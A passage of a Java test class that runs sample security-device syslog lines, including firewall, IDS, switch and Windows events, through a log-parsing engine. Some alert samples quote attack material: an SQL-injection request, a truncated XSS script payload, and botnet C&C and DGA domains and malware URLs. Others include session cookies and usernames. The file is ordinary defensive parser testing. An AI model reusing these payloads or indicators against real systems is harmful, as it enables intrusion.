      data = "<14>1 2022-05-06T10:27:09.464Z 172.18.6.187 metadata - - - {\"status_code\":\"200\",\"method\":\"GET\",\"server_header_names\":\"CONTENT-LENGTH: 22\\nDATE: Fri, 06 May 2022 10:27:23 GMT\\nCONNECTION: close\\nCONTENT-TYPE: text/plain, text/plain\\nCACHE-CONTROL: max-age=30, must-revalidate\\n\",\"event_source\":\"ratel_http\",\"interface\":\"em2\",\"uri\":\"/connecttest.txt\",\"version\":\"HTTP/1.1\",\"dst_ip\":\"23.55.47.155\",\"src_ip\":\"192.168.7.53\",\"src_port\":\"48909\",\"uid\":\"745851001317002\",\"client_header_names\":\"CONNECTION: Close\\nUSER-AGENT: Microsoft NCSI\\nHOST: www.msftconnecttest.com\\n\",\"resp_body\":\"Microsoft Connect Test\",\"proto\":\"tcp\",\"commid\":\"1:bZa1fQnACwb5f4rqXosoZZ7MUDQ=\",\"dst_port\":\"80\",\"host\":\"www.msftconnecttest.com\",\"status_msg\":\"OK\",\"sensor_ip\":\"10.10.1.6\",\"user_agent\":\"Microsoft NCSI\",\"ts\":\"1651832829.403\",\"timestamp\":\"1651832829463\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-06T10:37:10.006Z 172.18.6.187 metadata - - - {\"resp_pkts\":\"0\",\"packets_ts\":\"1651833416.588462,1651833417.587526,1651833419.613765,1651833423.613786\",\"session_record\":\"RQAANEAA30JcGMz9gAL68AAAAgQFtAEDAwgBAQQCRQAANEAA30JcGMz9gAL68AAAAgQFtAEDAwgBAQQCRQAANEAA30JcGMz9gAL68AAAAgQFtAEDAwgBAQQCRQAANEAA30JcGMz9gAL68AAAAgQFtAEDAwgBAQQC\",\"packets_dir\":\"1,1,1,1\",\"event_source\":\"ratel_conn\",\"interface\":\"em2\",\"dst_ip\":\"223.66.92.24\",\"resp_mac\":\"F6:23:21:51:03:52\",\"src_ip\":\"192.168.9.146\",\"duration\":\"7.025324\",\"uid\":\"1453163434015406\",\"conn_state\":\"S0\",\"commid\":\"1:nN7V6LPbD2ZtjxD1bvaALvsgqUw=\",\"packets_ip_flags\":\"0,0,0,0\",\"packets_tcp_flags\":\"2,2,2,2\",\"sensor_ip\":\"10.10.1.6\",\"timestamp\":\"1651833430000\",\"orig_bytes\":\"0\",\"packets_ip_ttl\":\"128,128,128,128\",\"orig_pkts\":\"4\",\"app_proto\":\"other\",\"packets_size\":\"0,0,0,0\",\"src_port\":\"55823\",\"resp_bytes\":\"0\",\"service\":\"other\",\"proto\":\"tcp\",\"dst_port\":\"52477\",\"orig_mac\":\"B0:7D:64:9D:23:C6\",\"ts\":\"1651833416.588\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-05T12:30:55.003Z 172.18.6.187 metadata - - - {\"event_source\":\"ratel_icmp\",\"icmp_seqs\":\"3\",\"interface\":\"em2\",\"icmp_ids\":\"5936\",\"dst_ip\":\"192.168.7.119\",\"src_ip\":\"172.16.103.111\",\"src_port\":\"8\",\"icmp_payloads\":\"K2uX+++c2EFRUVFRUVFRUVFRUVFRUVFR\",\"uid\":\"2211353089567442\",\"icmp_directions\":\"0\",\"icmp_pkt_lens\":\"24\",\"icmp_ttls\":\"64\",\"icmp_inner_times\":\"1651753824.682706\",\"proto\":\"icmp\",\"commid\":\"1:YXsnU1P8h4LcjtXv9T4hHeo8Ysc=\",\"dst_port\":\"0\",\"sensor_ip\":\"10.10.1.6\",\"ts\":\"1651753824.682\",\"timestamp\":\"1651753855000\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-06T09:43:01.767Z 172.18.6.187 metadata - - - {\"event_source\":\"ratel_mssql\",\"interface\":\"em2\",\"dst_ip\":\"192.168.100.40\",\"src_ip\":\"192.168.5.82\",\"src_port\":\"60055\",\"uid\":\"922597321950045\",\"proto\":\"tcp\",\"commid\":\"1:CnsB1ufeOnmafN4SFH8b575Ih+I=\",\"dst_port\":\"1433\",\"cmd\":\"TLS exchange\",\"sensor_ip\":\"10.10.1.6\",\"ts\":\"1651830181.712\",\"timestamp\":\"1651830181762\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-08-01T01:50:34.729Z 172.16.11.100 notice - - - {\"attacker_city\":\"jinan\",\"kill_chain\":\"attempt-attack\",\"enrichments.attacker.in_range\":1,\"dst_ip_geoloc\":\"36.665261,116.994895\",\"victim_geoloc\":\"36.665261,116.994895\",\"hostip\":\"172.16.3.141\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"10030001\",\"mat_off\":[56],\"uuid\":\"4f19b28d-0a2b-4fb1-99b2-8d0a2bbfb1ae\",\"number\":1,\"hostname\":\"ATD\",\"enrichments.src_ip.host_type\":\"2\",\"payload\":\"c2VsZWN0IGRpc3RpbmN0IGJ1dHhuLmhhbmRsZXJJZCBhcyBidXR4bl9oYW5kbGVySWQsUEFVU1IudXNlckNvZGUgYXMgUEFVU1JfdXNlckNvZGUsUEFVU1IudXNlck5hbWUgYXMgUEFVU1JfdXNlck5hbWUgZnJvbSBidXR4bkFSIGJ1dHhuIHJpZ2h0IGpvaW4gUEFVU1IgUEFVU1IgIG9uIGJ1dHhuLmhhbmRsZXJJZD1wYXVzci51c2VySWQgICAgd2hlcmUgMT0xIGFuZCBidXR4bi5oYW5kbGVySWQgaXMgbm90IEBAQCBhbmQgKFBBVVNSLnVzZXJDb2RlIGxpa2UgP3VzZXJDb2RlIG9yID91c2VyQ29kZSBpcyBAQEApICBhbmQgKFBBVVNSLnVzZXJOYW1lIGxpa2UgP3VzZXJOYW1lIG9yID91c2VyTmFtZSBpcyBAQEApICA=\",\"commid\":\"1:9xS0BwPh3XBg+7mD9G53UQiwDfE=\",\"enrichments.dst_ip.in_range\":1,\"enrichments.victim.in_range\":1,\"attack_status\":\"attempt\",\"victim_city\":\"jinan\",\"enrichments.dst_ip.host_type\":\"2\",\"attacker_country_code\":\"CN\",\"dst_ip_country\":\"China\",\"victim_country_code\":\"CN\",\"enrichments.src_ip.host_group\":\"Default Terminal Group\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"2\",\"http\":{\"status_code\":\"200\",\"method\":\"POST\",\"server_header_names\":\"SERVER: Apache-Coyote/1.1\\nSET-COOKIE: locale=zh_CN; Expires=Sat, 19-Aug-2090 05:05:01 GMT\\nCONTENT-TYPE: text/html;charset=utf-8\\nCONTENT-LENGTH: 78\\nDATE: Mon, 01 Aug 2022 01:50:54 GMT\\nCONNECTION: close\\n\",\"uri\":\"/EBP/srchBox.do?method=getSrchBoxData&pageInnerSql=select distinct butxn.handlerId as butxn_handlerId,PAUSR.userCode as PAUSR_userCode,PAUSR.userName as PAUSR_userName from butxnAR butxn right join PAUSR PAUSR on butxn.handlerId=pausr.userId where 1=1 and butxn.handlerId is not @@@ and (PAUSR.userCode like ?userCode or ?userCode is @@@) and (PAUSR.userName like ?userName or ?userName is @@@) &outputFields=butxn_handlerId,PAUSR_userCode,PAUSR_userName&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659318648965-645\",\"version\":\"HTTP/1.1\",\"referrer\":\"http://172.20.1.31:8080/EBP/tradeQuery.do?method=view&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659315144396-688&uuid=mainPageTaskMgr\",\"client_header_names\":\"HOST: 172.20.1.31:8080\\nCONNECTION: keep-alive\\nCONTENT-LENGTH: 45\\nACCEPT: application/json, text/javascript, */*; q=0.01\\nORIGIN: http://172.20.1.31:8080\\nX-REQUESTED-WITH: XMLHttpRequest\\nUSER-AGENT: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36\\nCONTENT-TYPE: application/x-www-form-urlencoded; charset=UTF-8\\nREFERER: http://172.20.1.31:8080/EBP/tradeQuery.do?method=view&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659315144396-688&uuid=mainPageTaskMgr\\nACCEPT-ENCODING: gzip, deflate\\nACCEPT-LANGUAGE: zh-CN,zh;q=0.9\\nCOOKIE: locale=zh_CN; JSESSIONID=1659B2E296130D00A8F6EE3C5D904228; EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK\\n\",\"request_body\":\"butxn_tranOrgNo=&userCode=zhai&page=1&rows=10\",\"content_type\":\"application/x-www-form-urlencoded\",\"resp_body\":\"{\\\"errorCode\\\":\\\"\\\",\\\"outEntity\\\":{\\\"total\\\":0,\\\"rows\\\":[]},\\\"errorMsg\\\":\\\"\\\",\\\"success\\\":\\\"0\\\"}\",\"host\":\"172.20.1.31\",\"status_msg\":\"OK\",\"xff\":\"\",\"user_agent\":\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36\"},\"mat_fid\":[\"client_header_names\"],\"desc\":\"method:POST;host:172.20.1.31;status_code:200;uri:/EBP/srchBox.do?method=getSrchBoxData&pageInnerSql=select distinct butxn.handlerId as butxn_handlerId,PAUSR.userCode as PAUSR_userCode,PAUSR.userName as PAUSR_userName from butxnAR butxn right join PAUSR PAUSR on butxn.handlerId=pausr.userId where 1=1 and butxn.handlerId is not @@@ and (PAUSR.userCode like ?userCode or ?userCode is @@@) and (PAUSR.userName like ?userName or ?userName is @@@) &outputFields=butxn_handlerId,PAUSR_userCode,PAUSR_userName&EAP_SID=JHDWCUATFIFDAJFGIQAPFQGQEJBTJAJQFQBQDQAK&locale=zh_CN&userId=500&random=1659318648965-645;\",\"sub_category\":\"\",\"src_ip_city\":\"jinan\",\"visit_direction_detail\":\"24\",\"reliability\":8,\"classtype\":\"web-attack\",\"interface\":\"em4\",\"dst_ip\":\"172.20.1.31\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"172.20.8.122\",\"dst_ip_city\":\"jinan\",\"victim\":\"172.20.1.31\",\"sensor_ip\":\"172.16.3.141\",\"visit_direction\":\"2\",\"timestamp\":\"1659318634682\",\"mat_end\":[406],\"severity\":2,\"enrichments.dst_ip.host_group\":\"Default Terminal Group\",\"enrichments.src_ip.in_range\":1,\"attacker\":\"172.20.8.122\",\"victim_country\":\"China\",\"attacker_geoloc\":\"36.665261,116.994895\",\"message\":\"SQL injection attack is a technique in which the input parameters are not filtered and then directly spliced into the SQL statement to parse and execute a malicious SQL statement for the purpose of attack. Developers should strictly check the type and format of input variables, filter and escape special characters.\",\"app_proto\":\"http\",\"target\":\"HTTP SQL injection attempt by AI Engine\",\"src_port\":\"54406\",\"engine_type\":\"ai\",\"src_ip_country_code\":\"CN\",\"attacker_country\":\"China\",\"dst_port\":\"8080\",\"src_ip_geoloc\":\"36.665261,116.994895\",\"src_ip_country\":\"China\",\"family\":\"\",\"category\":\"sql-injection\",\"resp_data\":\"\",\"ts\":\"1659318633.070\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //山石网科6000
  public void testFirewallHillstoneSG6000() {
    String parserFile = "./resources/parsers/firewall_hillstone_sg-6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<186>Jun 11 16:27:26 2508117215002539(root) 43340201 Alarm@NET: Switch loop maybe exist on interface redundant2.25 port redundant2.25";
/*      parse(botuEngine, data);
      data = "<190>Jun 11 14:51:42 2508117215002539(root) 47040607 Event@AAA: add user group Administrators done";
      parse(botuEngine, data);
      data = "<188>Jun 11 13:34:22 2508117215002539(root) 421c0403 Event@MGMT: Admin user \"admin\" logged out through https, and the IP is 172.16.2.15";
      parse(botuEngine, data);
      data = "<190>Jun 10 21:51:15 2508117215002539(root) 45140638 Event@VPN: User \"frankie\" on SCVPN \"HY_SSLVPN\" logs on from device type \"Apple Inc.\" hostid \"81f90d1133091d75c551f437dd656f15\" OS \"Windows 10 Enterprise - 19041.vb_release.191206-1406\" MAC \"A4:D1:8C:D5:D9:2E\" IP \"171.114.163.14\"(client, version \"1.4.9.1277\"), allocated IP \"172.16.100.18\", SPI \"06e264a1\"";
      parse(botuEngine, data);
      data = "<189>Jun 11 16:26:24 2508117215002539(root) 43240507 Event@NET: ARP entry 192.168.110.226 0000.0000.0000 is deleted for timeout";
      parse(botuEngine, data);
      data = "<189>Jun 11 16:26:24 2508117215002539(root) 43240507 Security@NET: attack-type:DROP! Destination IP 127.0.0.1. Occurred attack-times（N）times in the last seconds(X) seconds.";
      parse(botuEngine, data);
      data = "<189>Aug  8 11:34:12 2812035215002940(root) 43240501 Event@NET: ARP条目已创建，192.168.0.202，0016.31e1.bcc4，trust-vr";
      parse(botuEngine, data);
      data = "<190>Sep  7 08:59:24 261030KSA2432544(root) 44d4361b Traffic@waf-access:客户IP:116.179.32.221 客户端口:62805 目的IP:211.86.208.41 目的端口:443 真实服务器IP:211.86.208.41 真实服务器端口:443 站点名称:webplus64-3 协议:HTTPS HTTP版本:HTTP/2.0 持续时间:8毫秒 服务器响应时间:8毫秒 接收字节数:218 发送字节数:3959 HTTP方法:GET 域名:tlxytw.tlu.edu.cn 资源路径:/2021/0402/c2098a71354/page.htm 查询字符串:- 返回码:200 用户代理:Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)";
      parse(botuEngine, data);
      data = "<188>Oct 21 13:38:02 261030KSA2300802(root) 460c9413 Threat@FLOW: From 192.168.85.194:6439(ethernet1/1) to 210.45.160.12:6443(-), threat name: port-scan, threat type: Scan, threat subtype: Port Scan, App/Protocol: IPv4/TCP, action: ALARM, defender: AD, severity: Medium, zone l2-direct-a: Port scan attack, occurred 5 times in the last 59 seconds\\n\\u0000";
      parse(botuEngine, data);
      data = "<188>Jan 19 15:22:23 SG-6000(root) 460c5403 Security@FLOW: Huge ICMP pak attack:DROP! untrust::xethernet2/0 104.126.20.139->211.141.181.202. Occurred 5 times in the last 2919 seconds";
      parse(botuEngine, data);
      data = "<188>Sep  5 16:32:32 261030KSA3965909(root) 46a4941d Threat@FLOW: From 202.101.226.69(UNKNOWN:-@-):53(xethernet2/0) to 172.18.19.180(UNKNOWN:-@-):63778(xethernet2/2), threat name: Botnet C&C IP, threat type: Malware, threat subtype: Trojan, App/Protocol: DNS, action: reset, defender: BOTNET DETECT, CC server: 198.58.118.167, profile: test, threat severity: High, policy id: 2, aggregation attack count: 8";
      parse(botuEngine, data);
      data = "<188>Sep  6 15:19:42 5930148225007753(root) 460c9417 Threat@FLOW: From 172.18.1.34:35989(aggregate1) to 172.18.133.239:161(-), threat name: udp-flood, threat type: DoS, threat subtype: DDoS Flood, App/Protocol: IPv4/UDP, action: DROP, defender: AD, severity: Medium, zone untrust: UDP flood attack, occurred 7 times, traffic statistics:0.000615 MB in the last 7 seconds";
      parse(botuEngine, data);
      data = "<186>Sep  7 07:41:22 261030KSA3965909(root) 4808924b Threat@IPS: CRITICAL! From 172.18.1.18(UNKNOWN:-@-):4080(xethernet2/2) to 202.101.226.69(UNKNOWN:-@-):53(xethernet2/0), threat name: Trojan Activity: Win32/Beapy CnC Domain in DNS Lookup, threat type: Malware, threat subtype: Trojan, App/Protocol: DNS, action: reset, defender: IPS, signature ID: 105425, profile: ips, threat severity: Critical, policy id: 2, associated account: ---, aggregation attack count 2";
      parse(botuEngine, data);
      data = "<189>Jan 16 14:36:16 5823423215019348(root) 446c9204 HillstoneNetworks#Threat@SECURITY: 危险！从10.0.0.122（UNKNOWN:-@-）:32939（ethernet0/3）到192.168.1.111（UNKNOWN:-@-）:80（ethernet0/3），威胁名称：Apache Log4j2远程代码执行漏洞（CVE-2021-44228），威胁类型：网络攻击，威胁子类型：漏洞攻击，应用/协议：HTTP，响应行为：重置连接，检测引擎：IDS，威胁级别：严重，策略号：1，攻击次数：1，ATT&CK识别码：T1203,T1588.005,T1588.006，攻击者：10.0.0.122，受害者：192.168.1.111，攻击结果：企图，URL：http://192.168.1.111/cgi-bin/mt-static/mt-load.cgi，编号：334366，引擎模板：predef_default，关联账号：---";
      parse(botuEngine, data);
      data = "<189>Jan 21 88:88:80 10.182.184.103 5823413215884745(root) 480c942e HillstoneNetworks#Threat@Ips: Warning: From 20.1.1.3(UNKNOMN:-@-):62167(ethernet0/14) to 20.1.1.2(UNKNOWN:-0-):21(ethernet8/15), threat name: weak password, vulnerability: fTp weakpassword(There are too few character types in password), threat type: Attack, threat subtype: Password Attack, App/Protocol:...........,threat severity: Medium, policy type: FW,FTP, action: log-only, defender: IPs, signature ID: 265002, profile:policy id:1,Username: test, Password: ******,packet id: 0";
      parse(botuEngine, data);
      data = "<189>May 13 01:01:28 10.182.111.100 261030KSE0051284(root) 446c9403 Threat@SECURITY: Warning: From 10.192.9.66:4711(ethernet0/0) to 10.100.6.10:21(ethernet0/0), threat name: weak password, vulnerability: FTP weak password(The password is the same as the username), threat type: Attack, threat subtype: Password Attack, App/Protocol: FTP, action: log-only, defender: IPS, threat severity: Medium, policy id: 4, attack count: 1, att&ck id: T1110, attacker ip: -, victim ip: -, attack result: Success, ID: 265003, profile: tap-a-default-ips, username: anonymous, password: ******";
      parse(botuEngine, data);
      data = "<189>May 13 05:33:28 10.182.111.100 261030KSE0051284(root) 446c9403 Threat@SECURITY: Warning: From 116.153.69.137:80(ethernet0/0) to 10.182.191.185:22185(ethernet0/0), threat name: GENERIC.HS, threat type: Malware, threat subtype: Riskware, App/Protocol: HTTP, action: log-only, defender: AV, threat severity: Low, policy id: 4, attack count: 1, att&ck id: T1204.002, attacker ip: 116.153.69.137, victim ip: 10.182.191.185, attack result: Success, URL: http://cdn-wx-v6-lds.ludashi.com/v6/ludashi/745/Plugin/CouponHelper_tpi_5.5021.1035.1129.7z, profile: av_log, associated account: ---, MD5: 180d5ddd7f59e2d06fd80b3e8b273f45";
      parse(botuEngine, data);
      data = "<189>May 13 05:33:47 10.182.111.100 261030KSE0051284(root) 446c9403 Threat@SECURITY: Warning: From 10.182.135.94:53892(ethernet0/0) to 10.88.7.10:53(ethernet0/0), threat name: Botnet C&C Domain, threat type: Malware, threat subtype: Trojan, App/Protocol: DNS, action: sinkhole-replace, defender: BOTNET DETECT, threat severity: High, policy id: 4, attack count: 8, att&ck id: T1071.004, attacker ip: -, victim ip: 10.182.135.94, attack result: Confirmed Compromised, CC server: fget-career.com, botnet tag: Trojan,Malware,CnC, malware family: -, APT group: -, profile: botnet_sinkhole";
      parse(botuEngine, data);
      data = "<189>Jan 24 00:00:00 10.182.184.103 5823413215004745(root) 480c942e HillstoneNetworks#Threat@IPS: Warning: From 20.1.1.3(UNKNOWN:-@-):62167(ethernet0/14) to 20.1.1.2(UNKNOWN:-@-):21(ethernet0/15), threat name: weak password, vulnerability: FTP weak password(There are too few character types in password), threat type: Attack, threat subtype: Password Attack, App/Protocol: FTP, action: log-only, defender: IPS, signature ID: 265002, profile: ..........., threat severity: Medium, policy type: FW, policy id: 1, Username: test, Password: ******, packet id: 0";
      parse(botuEngine, data);
      data = "<189>Jan 24 01:00:00 10.182.184.103 5823413215004745(root) 46409428 HillstoneNetworks#Threat@FLOW: From 20.1.1.2(UNKNOWN:-@-):61058(ethernet0/15) to 20.1.1.3(UNKNOWN:-@-):62182(ethernet0/14), threat name: Unsafe.PE.AI, threat type: Malware, threat subtype: Riskware, App/Protocol: FTP-DATA, action: reset, defender: AV, URL ftp://20.1.1.2, profile: test, threat severity: Low, policy type: FW, policy id: 1, aggregation attack count: 1, md5: 5e29332943ae80baae189cea17414bd6";
      parse(botuEngine, data);
      data = "<189>Jan 24 02:00:00 10.182.184.103 5823413215004745(root) 46a49423 HillstoneNetworks#Threat@FLOW: From 172.16.50.162(UNKNOWN:-@-):53(ethernet0/14) to 172.16.50.20(UNKNOWN:-@-):52501(ethernet0/14), threat name: Botnet server access - DGA malicious domain, threat type: Malware, threat subtype: Trojan, App/Protocol: DNS, action: log-only, defender: BOTNET DETECT, domain name: rn4k4omr7rieulzbl1.com, IP address: 0.0.0.0, DGA family: rovnix, profile: test, threat severity: High, policy id: 1";
      parse(botuEngine, data);
      data = "<189>Jan 23 03:00:00 5823423215019348(root) 446c9404 HillstoneNetworks#Threat@SECURITY: 警告：从172.16.8.15（UNKNOWN:-@-）:1194（ethernet0/3）到172.16.8.150（UNKNOWN:-@-）:80（ethernet0/3），威胁名称：Microsoft Forefront Unified Access Gateway Signurl.asp跨站点脚本漏洞 (CVE-2010-3936)，威胁类型：网络攻击，威胁子类型：漏洞攻击，应用/协议：HTTP，响应行为：记录日志，检测引擎：IDS，威胁级别：中，策略号：1，攻击次数：1，ATT&CK识别码：T1059,T1588.005,T1588.006,T1189，攻击者：172.16.8.15，受害者：172.16.8.150，攻击结果：成功，URL：http://172.16.8.150:80/internalsite/signurl.asp?SignUrl=<form>Telus Security Labs PoC</form><script>alert(document.forms[0].inn，编号：321570，引擎模板：predef_loose，关联账号：---";
      parse(botuEngine, data);
      data = "<189>Apr 17 15:07:53 SG-6000 4810920b HillstoneNetworks#Threat@IPS: CRITICAL! From [3001::35](UNKNOWN:-@-):30429(ethernet0/4) to [3002::35](UNKNOWN:-@-):80(ethernet0/4), threat name: WordPress Marketplace Remote Code Execution Vulnerability (CVE-2014-9013), threat type: Attack, threat subtype: Vulnerability Exploit Attack, App/Protocol: HTTP, action: log-only, defender: IPS, signature ID: 336556, profile: predef_default, threat severity: High, policy type: FW, policy id: 8, packet id: 0";
      parse(botuEngine, data);*/
      data = "<21>May 13 01:01:28 10.182.111.100 261030KSE0051284(root) 446c9403 Threat@SECURITY: Warning: From 10.192.9.66:4711(ethernet0/0) to 10.100.6.10:21(ethernet0/0), threat name: weak password vulnerability: FTP weak password(The password is the same as the username), threat type: Attack, threat subtype: Password Attack, App/Protocol: FTP, action: log-only, defender: IPS, threat severity: Medium, policy id: 4, attack count: 1, att&ck id: T1110, attacker ip: -, victim ip: -, attack result: Success, ID: 265003, profile: tap-a-default-ips, username: anonymous, password: ******";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //华三交换机
  public void testH3Switch() {
    String parserFile = "./resources/parsers/switch_h3c_S5120V3-28P-LI[6329]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>Jun 11 13:00:47 2022 HY-CoreSW-3F-01 %%10LLDP/6/LLDP_CREATE_NEIGHBOR: Nearest bridge agent neighbor created on port GigabitEthernet1/0/13 (IfIndex 13), neighbor's chassis ID is d8bb-c10c-97ec, port ID is d8bb-c10c-97ec.";
      parse(botuEngine, data);
      data = "<190>Jun 11 12:45:25 2022 HY-CoreSW-3F-01 %%10LLDP/6/LLDP_DELETE_NEIGHBOR: Nearest bridge agent neighbor deleted on port GigabitEthernet1/0/13 (IfIndex 13), neighbor's chassis ID is 00e0-70d8-c545, port ID is 00e0-70d8-c545.";
      parse(botuEngine, data);
      data = "<190>Jun 11 06:46:20 2022 HY-CoreSW-3F-01 %%10SSHS/6/SSHS_AUTH_SUCCESS: SSH user admin from 172.16.2.15 port 50968 passed password authentication.";
      parse(botuEngine, data);
      data = "<187>Jun 10 13:56:24 2022 HY-CoreSW-3F-01 %%10IFNET/3/PHY_UPDOWN: Physical state on the interface GigabitEthernet1/0/4 changed to down.";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testNSfocusFirewall() {
    String parserFile = "./resources/parsers/firewall_nsfocus_NF[V6.0.3F01]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<5>time:2022-06-09 14:37:14;danger_degree:1;breaking_sighn:0;event:[50243]用户访问受控URL;src_addr:192.168.246.129;src_port:52294;dst_addr:192.168.246.130;dst_port:80;proto:TCP.HTTP;user:";
      parse(botuEngine, data);
      data = "<1>rule_id:1;time:2022-06-09 14:31:12;module:fw;src_intf:G1/1;dst_intf:;action:accept;proto:tcp;src_addr:10.14.69.177;src_port:32656;dst_addr:10.14.14.189;dst_port:21;src_addr_nat:;src_port_nat:;dst_addr_nat:;dst_port_nat:;info:;user:";
      parse(botuEngine, data);
      data = "<255>user:weboper;loginip:192.168.3.38;time:1654755305;type:1;登录成功";
      parse(botuEngine, data);
      data = "<255>time2021-12-13 07:44:40;module: network IP address 192.168.1.1 collision detected:sourced by 00:0D:48:72:B3:79 and 00:0C:29:E7:14:27 on G1/1";
      parse(botuEngine, data);
      data = "time2022-06-09 14:41:37;module: system 警告：当前的主板温度为38℃，超出设置的阈值30℃";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWindowsSyslog() {
    String parserFile = "./resources/parsers/os_microsoft_windows_eventlog_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<29>Jul 29 15:03:22 DELL Security-Auditing: 5156: AUDIT_SUCCESS Windows 筛选平台已允许连接。 应用程序信息： 进程 ID： 2692 应用程序名称： \\device\\harddiskvolume3\\windows\\system32\\svchost.exe 网络信息： 方向： 入站 源地址： 172.16.0.126 的源端口： 5353 的目标地址： 224.0.0.251 的目标端口： 5353 协议： 17 接口索引： 8 筛选器信息： 筛选器源： Unknown 筛选器 ID： 3626018 层名称： 接收/接受 层运行时 id： 44 远程用户 ID： S-1-0-0 远程计算机 ID： S-1-0-0";
      parse(botuEngine, data);
      data = "<29>Aug 19 15:06:21 WIN-R0B32KMCJ3H Eventlog to Syslog Service Stopped";
      parse(botuEngine, data);
      data = "<29>Aug 19 12:48:08 WIN-I2HJ5KJ28SP Eventlog to Syslog Service Stopped";
      parse(botuEngine, data);
      data = "<29>Aug 19 15:04:51 WIN-NN0S6H287AV FilterManager: 6: 文件系统筛选器“sfavflt”(10.0，\u200E2021\u200E-\u200E06\u200E-\u200E24T19:59:18.000000000Z)已成功加载并注册到筛选器管理器。";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testWindowsEventLog() {
    String parserFile = "./resources/parsers/os_microsoft_windows_eventlog_eventlog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data =
          "Category=12809, EventIdentifier=5152, TimeGenerated=Fri Aug 05 02:09:04 CST 2022, User=null, MS_SRC_ID=siCpHf0oQhCUAfkQpqfgMw, Message=Windows 筛选平台阻止了数据包。\n"
              + "\n" + "应用程序信息:\n" + "\t进程 ID:\t\t0\n" + "\t应用程序名称:\t-\n" + "\n"
              + "网络信息:\n" + "\t方向:\t\t入站\n" + "\t源地址:\t\t192.168.10.130\n"
              + "\t源端口:\t\t8081\n" + "\t目标地址:\t192.168.10.125\n"
              + "\t目标端口:\t\t64389\n" + "\t协议:\t\t6\n" + "\n" + "筛选器信息:\n"
              + "\t筛选器运行时 ID:\t71752\n" + "\t层名称:\t\tICMP 错误\n"
              + "\t层运行时 ID:\t28, EventType=5, MS_SRC_ADDRESS=192.168.10.125, SourceName=Microsoft-Windows-Security-Auditing, MS_COLLECT_TYPE=SCHEDULAR, DKEY_SOURCE_DATATYPE=OS/Microsoft/Windows/EventLog, MS_SRC_NAME=192.168.10.125, EventCode=5152, Type=审核失败, ComputerName=WIN-I2HJ5KJ28SP, MS_SRC_TYPE=/EventLog, CategoryString=筛选平台数据包丢弃, MS_SRC_DATA_TYPE=OS/Microsoft/Windows/EventLog/EventLog, MS_SRC_OBJ_NAME=Security, RecordNumber=8262660";
      MethodMetadata patternParse = new MethodMetadata("keyPositionSplitParse");
      VariableMetadata p1 = new VariableMetadata("f1");
      ConstantMetadata p2 = new ConstantMetadata(ExpressionType.CHAR, "','");
      ConstantMetadata p3 = new ConstantMetadata(ExpressionType.STRING,
          "\"=\"");
      patternParse.getParameters().add(p1);
      patternParse.getParameters().add(p2);
      patternParse.getParameters().add(p3);
      KeyPositionSplitParse patternOperand = (KeyPositionSplitParse) BotuOperandFactory.createOperand(
          patternParse, null);
      EntityMap entityMap = new EntityMapImpl();
      entityMap.putEntity("f1", data);
      patternOperand.operate(entityMap);
      botuEngine.parse(entityMap);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testDpTechUag() {
    String parserFile = "./resources/parsers/acm_dptech_uag3000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
